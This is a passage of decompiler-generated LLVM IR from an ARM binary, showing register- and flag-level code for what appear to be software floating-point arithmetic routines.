  %v6_1d910 = xor i1 %v4_1d908, true
  call void @__pseudo_cond_branch(i1 %v6_1d910, i32 %v0_1d910)
  %v0_1d914 = load i32, i32* %r1.global-to-local, align 4
  %v1_1d914 = or i32 %v0_1d914, 1048576
  store i32 %v1_1d914, i32* %r1.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  %v0_1d91c = load i32, i32* %r4.global-to-local, align 4
  %v1_1d91c = add i32 %v0_1d91c, -1
  store i32 %v1_1d91c, i32* @r4, align 4
  ret i32 %v4_1d8f8

; uselistorder directives
  uselistorder i32 %v5_1d900, { 1, 0, 5, 3, 4, 2, 6 }
  uselistorder i32 %v4_1d900, { 2, 1, 0 }
  uselistorder i32 %v1_1d8dc, { 2, 0, 1 }
  uselistorder i32 %v0_1d8d8, { 1, 0 }
  uselistorder i1 %v7_1d8cc, { 1, 0 }
  uselistorder i32 %v2_1d8ac, { 1, 0 }
  uselistorder i1 %v1_1d8ac, { 1, 0 }
  uselistorder i32 %v6_1d8a4, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1d8ac, { 1, 0, 2 }
  uselistorder i32 %v14_1d890, { 1, 3, 2, 0 }
  uselistorder i64 %v11_1d890, { 1, 0 }
  uselistorder i64 %v12_1d888, { 1, 0 }
  uselistorder i64 %v10_1d888, { 1, 0 }
  uselistorder i64 %v7_1d880, { 1, 0 }
  uselistorder i64 %v6_1d878, { 1, 0 }
  uselistorder i32 %v6_1d860, { 1, 0 }
  uselistorder i32 %v6_1d85c, { 1, 0, 2 }
  uselistorder i32 %v1_1d85c, { 5, 2, 3, 4, 1, 0 }
  uselistorder i32 %v2_1d854, { 4, 3, 0, 2, 1, 5, 6 }
  uselistorder i32 %v6_1d844, { 2, 1, 0 }
  uselistorder i32 %v5_1d840, { 2, 1, 0 }
  uselistorder i32 %v12_1d834, { 0, 2, 1 }
  uselistorder i32 %v9_1d834, { 1, 0 }
  uselistorder i32 %v6_1d834, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 1, 4, 5, 6, 7, 8, 10, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 1, 6, 2, 3, 4, 5, 0, 7 }
  uselistorder i32 -255, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg4, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 2, 3, 1, 4 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_1d8f0, { 1, 0 }
  uselistorder label %._crit_edge, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_1d8b8, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %.thread2, { 3, 2, 1, 0 }
}

define i32 @function_1d920() local_unnamed_addr {
dec_label_pc_1d920:
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_16 = alloca i32, align 4
  %v0_1d920 = load i1, i1* @cpsr_z, align 1
  %v1_1d920 = load i1, i1* @cpsr_n, align 1
  %v2_1d920 = load i1, i1* @cpsr_v, align 1
  %v3_1d920 = xor i1 %v1_1d920, %v2_1d920
  %v4_1d920 = or i1 %v0_1d920, %v3_1d920
  br i1 %v4_1d920, label %dec_label_pc_1d924, label %dec_label_pc_1da9c

dec_label_pc_1d924:                               ; preds = %dec_label_pc_1d920
  %v0_1d924 = load i32, i32* @r4, align 4
  %v4_1d924 = add i32 %v0_1d924, 54
  %v6_1d924 = sub i32 0, %v0_1d924
  %v7_1d924 = and i32 %v4_1d924, %v6_1d924
  %v8_1d924 = icmp slt i32 %v7_1d924, 0
  %v9_1d924 = icmp slt i32 %v4_1d924, 0
  %v10_1d924 = icmp eq i32 %v4_1d924, 0
  %v7_1d928 = icmp sgt i32 %v0_1d924, -54
  br i1 %v7_1d928, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_1d924
  store i32 0, i32* @r0, align 4
  %v8_1d92c = load i32, i32* @r1, align 4
  %v9_1d92c = and i32 %v8_1d92c, -2147483648
  store i32 %v9_1d92c, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1d924, %bb
  %v4_1d934 = xor i1 %v9_1d924, %v8_1d924
  %v5_1d934 = or i1 %v10_1d924, %v4_1d934
  call void @__pseudo_cond_branch(i1 %v5_1d934, i32 %tmp7)
  %v0_1d938 = load i32, i32* @r4, align 4
  %v1_1d938 = sub i32 0, %v0_1d938
  %v2_1d93c = sub i32 -32, %v0_1d938
  %v4_1d93c = add i32 %v0_1d938, 31
  %v5_1d93c = and i32 %v4_1d93c, %v1_1d938
  %v6_1d93c = icmp slt i32 %v5_1d93c, 0
  store i1 %v6_1d93c, i1* @cpsr_v, align 1
  %v6_1d940 = icmp slt i32 %v1_1d938, 32
  br i1 %v6_1d940, label %dec_label_pc_1d944, label %dec_label_pc_1d9b0

dec_label_pc_1d944:                               ; preds = %.thread1
  %v1_1d944 = add i32 %v2_1d93c, 12
  %v8_1d948 = icmp sgt i32 %v1_1d944, 0
  br i1 %v8_1d948, label %dec_label_pc_1d980, label %dec_label_pc_1d94c

dec_label_pc_1d94c:                               ; preds = %dec_label_pc_1d944
  %v1_1d94c = add i32 %v2_1d93c, 32
  %v1_1d950 = sub i32 0, %v2_1d93c
  %v0_1d954 = load i32, i32* @r0, align 4
  %v6_1d954 = shl i32 %v0_1d954, %v1_1d950
  store i32 %v6_1d954, i32* @r3, align 4
  %v2_1d958 = add i32 %v2_1d93c, 31
  %v3_1d958 = shl i32 1, %v2_1d958
  %v6_1d958 = lshr i32 %v0_1d954, %v1_1d94c
  %v1_1d95c = load i32, i32* @r1, align 4
  %v7_1d95c = shl i32 %v1_1d95c, %v1_1d950
  %v8_1d95c = or i32 %v7_1d95c, %v6_1d958
  %v1_1d960 = and i32 %v1_1d95c, -2147483648
  store i32 %v1_1d960, i32* @r2, align 4
  %tmp = bitcast i32 %v1_1d95c to float
  %tmp19 = call float @fabsf(float %tmp)
  %v1_1d964 = bitcast float %tmp19 to i32
  %tmp20 = icmp slt i32 %v6_1d954, 0
  %v4_1d968 = zext i1 %tmp20 to i32
  %v5_1d968 = add i32 %v8_1d95c, %v4_1d968
  %v5_1d96c = and i32 %v1_1d964, %v3_1d958
  %v6_1d96c = icmp ne i32 %v5_1d96c, 0
  %v7_1d96c = lshr i32 %v1_1d964, %v1_1d94c
  %v9_1d96c = add i32 %v7_1d96c, %v1_1d960
  %v10_1d96c = zext i1 %v6_1d96c to i32
  %v11_1d96c = add i32 %v9_1d96c, %v10_1d96c
  store i32 %v11_1d96c, i32* @r1, align 4
  %v19_1d96c = add i32 %v11_1d96c, %v10_1d96c
  %v20_1d96c = xor i32 %v19_1d96c, %v1_1d95c
  %v21_1d96c = xor i32 %v19_1d96c, %v7_1d96c
  %v22_1d96c = and i32 %v20_1d96c, %v21_1d96c
  %v23_1d96c = icmp slt i32 %v22_1d96c, 0
  store i1 %v23_1d96c, i1* @cpsr_v, align 1
  %v3_1d970 = mul i32 %v6_1d954, 2
  %v4_1d970 = or i32 %v3_1d970, %tmp7
  %v5_1d970 = icmp slt i32 %v4_1d970, 0
  store i1 %v5_1d970, i1* @cpsr_n, align 1
  %v6_1d970 = icmp eq i32 %v4_1d970, 0
  store i1 %v6_1d970, i1* @cpsr_z, align 1
  br i1 %v6_1d970, label %bb13, label %bb14

bb13:                                             ; preds = %dec_label_pc_1d94c
  %tmp21 = sext i1 %tmp20 to i32
  %v6_1d974 = add nsw i32 %tmp21, -1
  %v7_1d974 = and i32 %v5_1d968, %v6_1d974
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_1d94c, %bb13
  %v1_1d97c = phi i32 [ %v5_1d968, %dec_label_pc_1d94c ], [ %v7_1d974, %bb13 ]
  %v2_1d978 = load i32, i32* %stack_var_16, align 4
  store i32 %v2_1d978, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_1d97c

dec_label_pc_1d980:                               ; preds = %dec_label_pc_1d944
  %v1_1d980 = sub i32 0, %v2_1d93c
  %v1_1d984 = add i32 %v2_1d93c, 32
  %v0_1d988 = load i32, i32* @r0, align 4
  %v6_1d988 = shl i32 %v0_1d988, %v1_1d980
  store i32 %v6_1d988, i32* @r3, align 4
  %v6_1d98c = lshr i32 %v0_1d988, %v1_1d984
  %v1_1d990 = load i32, i32* @r1, align 4
  %v7_1d990 = shl i32 %v1_1d990, %v1_1d980
  %v8_1d990 = or i32 %v7_1d990, %v6_1d98c
  %v1_1d994 = and i32 %v1_1d990, -2147483648
  %tmp22 = icmp slt i32 %v6_1d988, 0
  %v4_1d998 = zext i1 %tmp22 to i32
  %v5_1d998 = add i32 %v8_1d990, %v4_1d998
  %v6_1d998 = icmp ult i32 %v5_1d998, %v8_1d990
  %v2_1d99c = zext i1 %v6_1d998 to i32
  %v3_1d99c = or i32 %v2_1d99c, %v1_1d994
  store i32 %v3_1d99c, i32* @r1, align 4
  %v9_1d99c = add nsw i32 %v3_1d99c, %v2_1d99c
  %v10_1d99c = sub i32 0, %v1_1d990
  %v11_1d99c = and i32 %v9_1d99c, %v10_1d99c
  %v12_1d99c = icmp slt i32 %v11_1d99c, 0
  store i1 %v12_1d99c, i1* @cpsr_v, align 1
  %v3_1d9a0 = mul i32 %v6_1d988, 2
  %v4_1d9a0 = or i32 %v3_1d9a0, %tmp7
  %v5_1d9a0 = icmp slt i32 %v4_1d9a0, 0
  store i1 %v5_1d9a0, i1* @cpsr_n, align 1
  %v6_1d9a0 = icmp eq i32 %v4_1d9a0, 0
  store i1 %v6_1d9a0, i1* @cpsr_z, align 1
  br i1 %v6_1d9a0, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_1d980
  %tmp23 = sext i1 %tmp22 to i32
  %v6_1d9a4 = add nsw i32 %tmp23, -1
  %v7_1d9a4 = and i32 %v5_1d998, %v6_1d9a4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_1d980, %bb15
  %v1_1d9ac = phi i32 [ %v5_1d998, %dec_label_pc_1d980 ], [ %v7_1d9a4, %bb15 ]
  %v2_1d9a8 = load i32, i32* %stack_var_16, align 4
  store i32 %v2_1d9a8, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_1d9ac

dec_label_pc_1d9b0:                               ; preds = %.thread1
  %v1_1d9b0 = sub i32 32, %v2_1d93c
  %v1_1d9b4 = load i32, i32* @r0, align 4
  %v7_1d9b4 = shl i32 %v1_1d9b4, %v1_1d9b0
  %v8_1d9b4 = or i32 %v7_1d9b4, %tmp7
  %v6_1d9b8 = lshr i32 %v1_1d9b4, %v2_1d93c
  %v1_1d9bc = load i32, i32* @r1, align 4
  %v7_1d9bc = shl i32 %v1_1d9bc, %v1_1d9b0
  %v8_1d9bc = or i32 %v7_1d9bc, %v6_1d9b8
  store i32 %v8_1d9bc, i32* @r3, align 4
  %v6_1d9c0 = lshr i32 %v1_1d9bc, %v2_1d93c
  %v1_1d9c4 = and i32 %v1_1d9bc, -2147483648
  store i32 %v1_1d9c4, i32* @r1, align 4
  %v7_1d9c8 = lshr i32 %v1_1d9c4, %v2_1d93c
  %v8_1d9c8 = sub i32 -1, %v7_1d9c8
  %v9_1d9c8 = and i32 %v6_1d9c0, %v8_1d9c8
  %tmp24 = icmp slt i32 %v8_1d9bc, 0
  %v4_1d9cc = zext i1 %tmp24 to i32
  %v5_1d9cc = add i32 %v4_1d9cc, %v9_1d9c8
  %v3_1d9d0 = mul i32 %v8_1d9bc, 2
  %v4_1d9d0 = or i32 %v8_1d9b4, %v3_1d9d0
  %v5_1d9d0 = icmp slt i32 %v4_1d9d0, 0
  store i1 %v5_1d9d0, i1* @cpsr_n, align 1
  %v6_1d9d0 = icmp eq i32 %v4_1d9d0, 0
  store i1 %v6_1d9d0, i1* @cpsr_z, align 1
  br i1 %v6_1d9d0, label %bb17, label %bb18

bb17:                                             ; preds = %dec_label_pc_1d9b0
  %tmp25 = sext i1 %tmp24 to i32
  %v6_1d9d4 = add nsw i32 %tmp25, -1
  %v7_1d9d4 = and i32 %v5_1d9cc, %v6_1d9d4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_1d9b0, %bb17
  %v1_1d9dc = phi i32 [ %v5_1d9cc, %dec_label_pc_1d9b0 ], [ %v7_1d9d4, %bb17 ]
  %v2_1d9d8 = load i32, i32* %stack_var_16, align 4
  store i32 %v2_1d9d8, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_1d9dc

dec_label_pc_1da9c:                               ; preds = %dec_label_pc_1d920
  %v0_1da9c = load i32, i32* @r1, align 4
  %v1_1da9c = and i32 %v0_1da9c, -2147483648
  %v1_1daa4 = or i32 %v1_1da9c, 2146435072
  store i32 %v1_1daa4, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v5_1d9cc, { 1, 0 }
  uselistorder i32 %v5_1d998, { 1, 0, 2 }
  uselistorder i32 %v8_1d990, { 1, 0 }
  uselistorder i32 %v1_1d980, { 1, 0 }
  uselistorder i32 %v5_1d968, { 1, 0 }
  uselistorder i32 %v1_1d95c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1d950, { 1, 0 }
  uselistorder i32 %v2_1d93c, { 5, 6, 7, 9, 0, 1, 2, 3, 4, 8 }
  uselistorder i32 %v1_1d938, { 1, 0 }
  uselistorder i32 %v4_1d924, { 1, 2, 0 }
  uselistorder i32 %v0_1d924, { 1, 0, 2 }
  uselistorder i32 %tmp10, { 1, 0 }
  uselistorder i32 %tmp6, { 2, 1, 0 }
  uselistorder i32 %tmp5, { 2, 1, 0 }
  uselistorder i32 12, { 49, 50, 51, 58, 8, 59, 61, 3, 1, 2, 62, 63, 5, 0, 4, 73, 27, 10, 28, 11, 12, 60, 64, 65, 66, 67, 68, 13, 69, 57, 14, 74, 75, 9, 129, 130, 131, 132, 133, 135, 136, 134, 137, 138, 139, 140, 141, 142, 143, 15, 16, 17, 18, 20, 19, 21, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 89, 87, 70, 71, 22, 23, 52, 53, 54, 55, 56, 29, 30, 24, 31, 32, 33, 42, 47, 34, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 6, 25, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 125, 118, 119, 120, 121, 122, 123, 124, 126, 127, 26, 128, 72, 7, 88, 35, 36, 37, 38, 39, 40, 43, 44, 45, 46, 48, 41 }
  uselistorder i32 -32, { 4, 3, 5, 9, 10, 14, 11, 15, 16, 0, 12, 2, 13, 6, 8, 7, 1, 17 }
  uselistorder i32 54, { 3, 0, 1, 2 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_1dab4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1dab4:
  %v1_1dab8 = or i32 %arg1, 2146959360
  store i32 %v1_1dab8, i32* @r1, align 4
  store i32 %arg2, i32* @r4, align 4
  %v1_1dac0 = load i32, i32* @r0, align 4
  ret i32 %v1_1dac0
}

define i32 @function_1dac4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1dac4:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* @r3, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1dac4 = load i32, i32* @r4, align 4
  store i32 %v3_1dac4, i32* %stack_var_-16, align 4
  %v6_1dac4 = load i32, i32* @r5, align 4
  %v9_1dac4 = load i32, i32* @r6, align 4
  %v12_1dac4 = load i32, i32* @lr, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v1_1dad0 = load i32, i32* @r1, align 4
  %v4_1dad0 = udiv i32 %v1_1dad0, 1048576
  %v5_1dad0 = urem i32 %v4_1dad0, 2048
  store i32 %v5_1dad0, i32* @r4, align 4
  %v6_1dad0 = icmp eq i32 %v5_1dad0, 0
  br i1 %v6_1dad0, label %dec_label_pc_1dac4..thread2_crit_edge, label %bb

dec_label_pc_1dac4..thread2_crit_edge:            ; preds = %dec_label_pc_1dac4
  %.pre147 = udiv i32 %arg4, 1048576
  br label %.thread2

bb:                                               ; preds = %dec_label_pc_1dac4
  %v5_1dad4 = udiv i32 %arg4, 1048576
  %v6_1dad4 = urem i32 %v5_1dad4, 2048
  store i32 %v6_1dad4, i32* %r5.global-to-local, align 4
  %v7_1dad4 = icmp eq i32 %v6_1dad4, 0
  br i1 %v7_1dad4, label %.thread1, label %bb90

.thread1:                                         ; preds = %bb
  br label %dec_label_pc_1dc60

bb90:                                             ; preds = %bb
  %v5_1dad8 = icmp eq i32 %v5_1dad0, 2047
  br i1 %v5_1dad8, label %.thread2, label %bb91

.thread2:                                         ; preds = %dec_label_pc_1dac4..thread2_crit_edge, %bb90
  %.pre145.pre-phi = phi i32 [ %.pre147, %dec_label_pc_1dac4..thread2_crit_edge ], [ %v5_1dad4, %bb90 ]
  br label %dec_label_pc_1dc60

bb91:                                             ; preds = %bb90
  %v5_1dadc = icmp eq i32 %v6_1dad4, 2047
  br i1 %v5_1dadc, label %dec_label_pc_1dc60, label %dec_label_pc_1dae4

dec_label_pc_1dae4:                               ; preds = %bb91
  %v2_1dae4 = sub nsw i32 %v5_1dad0, %v6_1dad4
  store i32 %v2_1dae4, i32* %r4.global-to-local, align 4
  %v2_1dae8 = xor i32 %v1_1dad0, %arg4
  %v4_1daec = mul i32 %arg4, 4096
  %v5_1daec = or i32 %v4_1daec, %arg3
  store i32 %v5_1daec, i32* %r5.global-to-local, align 4
  %v7_1daec = icmp eq i32 %v5_1daec, 0
  %v3_1daf0 = mul i32 %v1_1dad0, 4096
  store i32 %v3_1daf0, i32* %r1.global-to-local, align 4
  br i1 %v7_1daec, label %dec_label_pc_1dc2c, label %dec_label_pc_1daf8

dec_label_pc_1daf8:                               ; preds = %dec_label_pc_1dae4
  %tmp92 = mul i32 %arg4, 256
  %v4_1db00 = and i32 %tmp92, 268435200
  %v4_1db04 = udiv i32 %arg3, 16777216
  %v5_1db00 = or i32 %v4_1db04, %v4_1db00
  %v5_1db04 = or i32 %v5_1db00, 268435456
  store i32 %v5_1db04, i32* %r3.global-to-local, align 4
  %v3_1db08 = mul i32 %arg3, 256
  store i32 %v3_1db08, i32* %r2.global-to-local, align 4
  %tmp93 = mul i32 %v1_1dad0, 256
  %v4_1db0c = and i32 %tmp93, 268435200
  %v1_1db10 = load i32, i32* @r0, align 4
  %v4_1db10 = udiv i32 %v1_1db10, 16777216
  %v5_1db0c = or i32 %v4_1db0c, %v4_1db10
  %v5_1db10 = or i32 %v5_1db0c, 268435456
  store i32 %v5_1db10, i32* %r5.global-to-local, align 4
  %v3_1db14 = mul i32 %v1_1db10, 256
  store i32 %v3_1db14, i32* %r6.global-to-local, align 4
  %v1_1db18 = and i32 %v2_1dae8, -2147483648
  store i32 %v1_1db18, i32* %r1.global-to-local, align 4
  %v3_1db1c = icmp uge i32 %v5_1db10, %v5_1db04
  %v9_1db1c = icmp eq i32 %v5_1db10, %v5_1db04
  br i1 %v9_1db1c, label %bb94, label %bb95

bb94:                                             ; preds = %dec_label_pc_1daf8
  %v4_1db20 = icmp uge i32 %v3_1db14, %v3_1db08
  br label %bb95

bb95:                                             ; preds = %dec_label_pc_1daf8, %bb94
  %v1_1db24 = phi i1 [ %v3_1db1c, %dec_label_pc_1daf8 ], [ %v4_1db20, %bb94 ]
  %v2_1db24 = add nsw i32 %v2_1dae4, 253
  %v3_1db24 = zext i1 %v1_1db24 to i32
  %v4_1db24 = add nsw i32 %v2_1db24, %v3_1db24
  %v8_1db24 = icmp ule i32 %v4_1db24, %v2_1dae4
  %v9_1db24 = icmp ugt i32 %v2_1dae4, -254
  %v10_1db24 = select i1 %v1_1db24, i1 %v8_1db24, i1 %v9_1db24
  %v1_1db28 = add nsw i32 %v4_1db24, 768
  store i32 %v1_1db28, i32* %r4.global-to-local, align 4
  br i1 %v10_1db24, label %dec_label_pc_1db38, label %dec_label_pc_1db30

dec_label_pc_1db30:                               ; preds = %bb95
  %v3_1db30 = udiv i32 %v5_1db04, 2
  store i32 %v3_1db30, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1db38

dec_label_pc_1db38:                               ; preds = %bb95, %dec_label_pc_1db30
  %v0_1db40 = phi i32 [ %v5_1db04, %bb95 ], [ %v3_1db30, %dec_label_pc_1db30 ]
  %v0_1db44 = phi i32 [ %v3_1db08, %bb95 ], [ 0, %dec_label_pc_1db30 ]
  %v2_1db38 = sub i32 %v3_1db14, %v0_1db44
  store i32 %v2_1db38, i32* %r6.global-to-local, align 4
  %v3_1db38 = icmp uge i32 %v3_1db14, %v0_1db44
  %v3_1db3c = icmp eq i1 %v3_1db38, false
  %v4_1db3c = sub nsw i32 %v5_1db10, %v0_1db40
  %v6_1db3c = sext i1 %v3_1db3c to i32
  %v7_1db3c = add nsw i32 %v6_1db3c, %v4_1db3c
  store i32 %v7_1db3c, i32* %r5.global-to-local, align 4
  %v3_1db40 = udiv i32 %v0_1db40, 2
  store i32 %v3_1db40, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1db50.outer

dec_label_pc_1db50.outer:                         ; preds = %dec_label_pc_1dbe8, %dec_label_pc_1db38
  %v1_1dbfc.ph = phi i32 [ %v2_1dbe8, %dec_label_pc_1dbe8 ], [ %v1_1db18, %dec_label_pc_1db38 ]
  %v0_1db54.ph = phi i32 [ %v5_1dbc4, %dec_label_pc_1dbe8 ], [ %v7_1db3c, %dec_label_pc_1db38 ]
  %v1_1db58.ph = phi i32 [ %v3_1dbc8, %dec_label_pc_1dbe8 ], [ %v2_1db38, %dec_label_pc_1db38 ]
  %v5_1dbd017.ph = phi i32 [ %v5_1dbd0, %dec_label_pc_1dbe8 ], [ %v3_1db40, %dec_label_pc_1db38 ]
  %v3_1dbd413.ph = phi i32 [ %v3_1dbd4, %dec_label_pc_1dbe8 ], [ 0, %dec_label_pc_1db38 ]
  %storemerge133 = phi i32 [ 0, %dec_label_pc_1dbe8 ], [ 1048576, %dec_label_pc_1db38 ]
  %storemerge = phi i32 [ -2147483648, %dec_label_pc_1dbe8 ], [ 524288, %dec_label_pc_1db38 ]
  store i32 %storemerge133, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1db50

dec_label_pc_1db50:                               ; preds = %dec_label_pc_1db50.outer, %dec_label_pc_1dbc0
  %v1_1dbb459 = phi i32 [ %v2_1dbfc, %dec_label_pc_1dbc0 ], [ %storemerge133, %dec_label_pc_1db50.outer ]
  %v1_1db60 = phi i32 [ %v1_1db6032, %dec_label_pc_1dbc0 ], [ %storemerge133, %dec_label_pc_1db50.outer ]
  %v1_1db7c41 = phi i32 [ %v1_1db7c43, %dec_label_pc_1dbc0 ], [ %storemerge133, %dec_label_pc_1db50.outer ]
  %v1_1db9850 = phi i32 [ %v1_1db9852, %dec_label_pc_1dbc0 ], [ %storemerge133, %dec_label_pc_1db50.outer ]
  %v0_1dbd8 = phi i32 [ %v3_1dbd8, %dec_label_pc_1dbc0 ], [ %storemerge, %dec_label_pc_1db50.outer ]
  %v0_1db54 = phi i32 [ %v5_1dbc4, %dec_label_pc_1dbc0 ], [ %v0_1db54.ph, %dec_label_pc_1db50.outer ]
  %v1_1db58 = phi i32 [ %v3_1dbc8, %dec_label_pc_1dbc0 ], [ %v1_1db58.ph, %dec_label_pc_1db50.outer ]
  %v5_1dbd017 = phi i32 [ %v5_1dbd0, %dec_label_pc_1dbc0 ], [ %v5_1dbd017.ph, %dec_label_pc_1db50.outer ]
  %v3_1dbd413 = phi i32 [ %v3_1dbd4, %dec_label_pc_1dbc0 ], [ %v3_1dbd413.ph, %dec_label_pc_1db50.outer ]
  %v3_1db50 = icmp uge i32 %v1_1db58, %v3_1dbd413
  %v3_1db54 = icmp eq i1 %v3_1db50, false
  %v4_1db54 = sub i32 %v0_1db54, %v5_1dbd017
  %v6_1db54 = sext i1 %v3_1db54 to i32
  %v7_1db54 = add i32 %v6_1db54, %v4_1db54
  %v8_1db54 = zext i1 %v3_1db54 to i32
  %v9_1db54 = sub i32 %v7_1db54, %v8_1db54
  %v10_1db54 = icmp ult i32 %v0_1db54, %v9_1db54
  %v11_1db54 = icmp ne i32 %v5_1dbd017, -1
  %v12_1db54 = or i1 %v11_1db54, %v10_1db54
  %v13_1db54 = icmp ult i32 %v0_1db54, %v5_1dbd017
  %v14_1db54 = select i1 %v3_1db54, i1 %v12_1db54, i1 %v13_1db54
  br i1 %v14_1db54, label %.thread4, label %bb96

bb96:                                             ; preds = %dec_label_pc_1db50
  %v3_1db58 = sub i32 %v1_1db58, %v3_1dbd413
  store i32 %v3_1db58, i32* %r6.global-to-local, align 4
  store i32 %v7_1db54, i32* %r5.global-to-local, align 4
  %v3_1db60 = or i32 %v1_1db60, %v0_1dbd8
  store i32 %v3_1db60, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1db50, %bb96
  %v1_1dbb458 = phi i32 [ %v1_1dbb459, %dec_label_pc_1db50 ], [ %v3_1db60, %bb96 ]
  %v1_1db6035 = phi i32 [ %v1_1db60, %dec_label_pc_1db50 ], [ %v3_1db60, %bb96 ]
  %v1_1db7c = phi i32 [ %v1_1db7c41, %dec_label_pc_1db50 ], [ %v3_1db60, %bb96 ]
  %v1_1db9849 = phi i32 [ %v1_1db9850, %dec_label_pc_1db50 ], [ %v3_1db60, %bb96 ]
  %v0_1db70 = phi i32 [ %v0_1db54, %dec_label_pc_1db50 ], [ %v7_1db54, %bb96 ]
  %v1_1db74 = phi i32 [ %v1_1db58, %dec_label_pc_1db50 ], [ %v3_1db58, %bb96 ]
  %v1_1db64 = urem i32 %v5_1dbd017, 2
  %v2_1db64 = icmp ne i32 %v1_1db64, 0
  %v3_1db64 = udiv i32 %v5_1dbd017, 2
  %v3_1db68 = zext i1 %v2_1db64 to i32
  %v6_1db68 = zext i32 %v3_1dbd413 to i64
  %v7_1db68 = sub i32 33, %v3_1dbd413
  %v8_1db68 = zext i32 %v7_1db68 to i64
  %v9_1db68 = shl i64 %v6_1db68, %v8_1db68
  %v10_1db68 = sub i32 32, %v3_1dbd413
  %v11_1db68 = shl i32 %v3_1db68, %v10_1db68
  %v12_1db68 = zext i32 %v11_1db68 to i64
  %v14_1db68 = or i64 %v12_1db68, %v9_1db68
  %v15_1db68 = trunc i64 %v14_1db68 to i32
  %v3_1db6c = icmp uge i32 %v1_1db74, %v15_1db68
  %v3_1db70 = icmp eq i1 %v3_1db6c, false
  %v4_1db70 = sub i32 %v0_1db70, %v3_1db64
  %v6_1db70 = sext i1 %v3_1db70 to i32
  %v7_1db70 = add i32 %v6_1db70, %v4_1db70
  %v13_1db70 = icmp ult i32 %v0_1db70, %v3_1db64
  %v14_1db70 = or i1 %v13_1db70, %v3_1db70
  br i1 %v14_1db70, label %.thread6, label %bb97

bb97:                                             ; preds = %.thread4
  %v3_1db74 = sub i32 %v1_1db74, %v15_1db68
  store i32 %v3_1db74, i32* %r6.global-to-local, align 4
  store i32 %v7_1db70, i32* %r5.global-to-local, align 4
  %v5_1db7c = udiv i32 %v0_1dbd8, 2
  %v6_1db7c = or i32 %v1_1db7c, %v5_1db7c
  store i32 %v6_1db7c, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %.thread4, %bb97
  %v1_1dbb457 = phi i32 [ %v1_1dbb458, %.thread4 ], [ %v6_1db7c, %bb97 ]
  %v1_1db6034 = phi i32 [ %v1_1db6035, %.thread4 ], [ %v6_1db7c, %bb97 ]
  %v1_1db7c45 = phi i32 [ %v1_1db7c, %.thread4 ], [ %v6_1db7c, %bb97 ]
  %v1_1db98 = phi i32 [ %v1_1db9849, %.thread4 ], [ %v6_1db7c, %bb97 ]
  %v0_1db8c = phi i32 [ %v0_1db70, %.thread4 ], [ %v7_1db70, %bb97 ]
  %v1_1db90 = phi i32 [ %v1_1db74, %.thread4 ], [ %v3_1db74, %bb97 ]
  %v1_1db80 = urem i32 %v3_1db64, 2
  %v2_1db80 = icmp ne i32 %v1_1db80, 0
  %v3_1db80 = udiv i32 %v5_1dbd017, 4
  %v3_1db84 = zext i1 %v2_1db80 to i32
  %v6_1db84 = and i64 %v14_1db68, 4294967295
  %v7_1db84 = sub i32 33, %v15_1db68
  %v8_1db84 = zext i32 %v7_1db84 to i64
  %v9_1db84 = shl i64 %v6_1db84, %v8_1db84
  %v10_1db84 = sub i32 32, %v15_1db68
